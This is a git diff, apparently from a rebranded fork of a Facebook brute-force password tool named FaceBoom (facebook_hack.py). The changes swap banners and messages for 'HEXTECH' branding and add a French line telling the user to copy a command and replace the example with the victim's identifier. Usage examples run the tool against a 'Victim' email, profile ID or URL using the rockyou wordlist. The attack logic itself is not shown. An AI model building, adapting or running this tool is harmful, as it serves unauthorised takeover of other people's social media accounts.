@@ -35,13 +35,13 @@ try:
     import requests
 except ImportError:
     errMsg("[ requests ] module is missing")
-    print("  [*] Please Use: 'pip install requests' to install it :)")
+    print("  [HEXTECH] Please Use: 'pip install requests' to install it :)")
     sys.exit(1)
 try:
     import mechanize
 except ImportError:
     errMsg("[ mechanize ] module is missing")
-    print("  [*] Please Use: 'pip install mechanize' to install it :)")
+    print("  [HEXTECH] Please Use: 'pip install mechanize' to install it :)")
     sys.exit(1)
 
 
@@ -117,22 +117,22 @@ class FaceBoom(object):
     def banner(self, target, wordlist, single_passwd):
 
         proxystatus = gr + self.useProxy + wi + "[" + gr + "ON" + wi + "]" if self.useProxy else yl + "[" + rd + "OFF" + yl + "]"
-        print(bl + """
+        print(gr + """
 ==================================
-[---]   """ + wi + """『𝐇𝐄𝐗✦𝐓𝐄𝐂𝐇』""" + bl + """        [---]
+[---]   """ + "\033[1;32m" + """『𝐇𝐄𝐗✦𝐓𝐄𝐂𝐇』""" + gr + """FaceBook_hack        [---]
 ==================================
-[---]  """ + wi + """BruteForce Facebook  """ + bl + """ [---]
+[---]  """ + wi + """BruteForce Facebook  """ + gr + """ [---]
 ==================================
-[---]         """ + yl + """CONFIG""" + bl + """         [---]
+[---]         """ + yl + """CONFIG""" + gr + """         [---]
 ==================================
-[>] Target      :> """ + wi + target + bl + """
+[>] Target      :> """ + wi + target + gr + """
 {}""".format("[>] Wordlist    :> " + yl + str(wordlist) if not single_passwd else "[>] Password    :> " + yl + str(
-            single_passwd)) + bl + """
+            single_passwd)) + gr + """
 [>] ProxyStatus :> """ + str(proxystatus) + wi)
         if not single_passwd:
-            print(bl + """\
+            print(gr + """\
 ==================================""" + wi + """
-[~] """ + yl + """Brute""" + rd + """ ForceATTACK: """ + gr + """Enabled """ + wi + """[~]""" + bl + """
+[~] """ + yl + """Brute""" + rd + """ ForceATTACK: """ + gr + """Enabled """ + wi + """[~]""" + gr + """
 ==================================\n""" + wi)
         else:
             print("\n")
@@ -158,11 +158,11 @@ class FaceBoom(object):
                 facebook_hackScript.write(newCode)
             with open(versionPath, "w") as ver:
                 ver.write(repoVersion)
-            write("  [+] Successfully updated :)\n")
+            write("  [HEXTECH RAPPORT] Successfully updated :)\n")
 
 
-parse = optparse.OptionParser(wi + """
-Usage: python facebook_hack.py [OPTIONS...]
+parse = optparse.OptionParser(bl + """
+.......... 『ＨＥＸ✦ＴＥＣＨ』voici les [OPTIONS...]
 -------------
 OPTIONS:
        |
@@ -181,7 +181,7 @@ OPTIONS:
 -------------
 Examples:
         |
-     |--------
+     |-------- COPIE UNE DE CES COMMANDE REMPLACE L'EXEMPLE PAR L'IDENTIFIANT DE LA VICTIME 
      | python facebook_hack.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
      |--------
      | python facebook_hack.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
@@ -192,7 +192,7 @@ Examples:
      |--------
      | python facebook_hack.py -g https://www.facebook.com/Victim_Profile
      |--------
-""")
+""" + wi)
 
 
 def Main():
@@ -234,7 +234,7 @@ def Main():
         if single_passwd:
             if len(single_passwd.strip()) < 6:
                 errMsg("Invalid Password")
-                print("[!] Password must be at least '6' characters long")
+                print("[HEXTECH] Password must be at least '6' characters long")
                 sys.exit(1)
         if proxy:
             if proxy.count(".") != 3:
